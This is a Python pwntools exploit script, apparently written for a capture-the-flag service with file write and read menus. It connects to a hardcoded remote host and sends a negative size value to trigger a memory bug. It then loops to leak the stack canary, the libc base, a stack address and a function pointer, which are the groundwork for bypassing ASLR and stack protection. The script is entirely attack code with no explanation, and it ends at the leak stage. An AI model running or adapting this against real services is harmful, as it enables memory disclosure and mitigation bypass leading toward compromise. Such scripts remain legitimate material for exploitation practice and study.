# coding:utf-8
from pwn import *

LOCAL = True
if LOCAL:
    mip = "2233"
    libc = ELF("../../libc-2.23.so")
    context.log_level = 'debug'
    io = remote("10.211.55.9", 22334)
else:
    mip = "114.243.132.48"
    context.log_level = 'debug'
    libc = ELF("./libc.so.6")
    io = remote("104.236.0.107", 11111)

def mmenu(choice):
    io.recvuntil("> ")
    io.sendline(str(choice))

def prewrite(fname):
    mmenu(1)
    io.send(fname)

def preread(fname):
    mmenu(2)
    io.send(fname)


def mwrite(msize, content, key):
    mmenu(3)
    io.recvuntil("Size data")
    io.sendline(str(msize))
    io.recvuntil("Data> ")
    io.send(content)
    io.recvuntil("Key> ")
    io.send(key)

def mread(key):
    mmenu(3)
    io.recvuntil("Enter key> ")
    io.send(key)

def leakit():
    tmpkey = 'k'*0x10
    try:
        # write
        prewrite("funck\n")
        fill_data = "/////"+mip+chr(0)
        pause()
        mwrite(-2147483647, fill_data*0x260, tmpkey)
        # read
        preread("mleaks\n")
        data = io.recvuntil("a56174d4e4911bd0a80aa99bd134e3c9")
        if mip in data:
            mread(tmpkey)
            io.recvuntil("Your data (size: ")
            io.recvline()
            io.recv(0x418)
            libc.address = u64(io.recv(8)) - libc.symbols["__libc_start_main"] - 0xF0
            io.recv(8)
            stack_addr = u64(io.recv(8)) - 0xa8
            io.recv(8)
            main_func = u64(io.recv(8))
            io.recv(8)
            canary_val = u64(io.recv(8))
            
            log.info("canary:"+hex(canary_val))
            log.info("libc address:" + hex(libc.address))
        else:
            pass
    except EOFError:
        io.close()
        pass

if __name__ == "__main__":
    for i in range(100):
        leakit()
    pause()

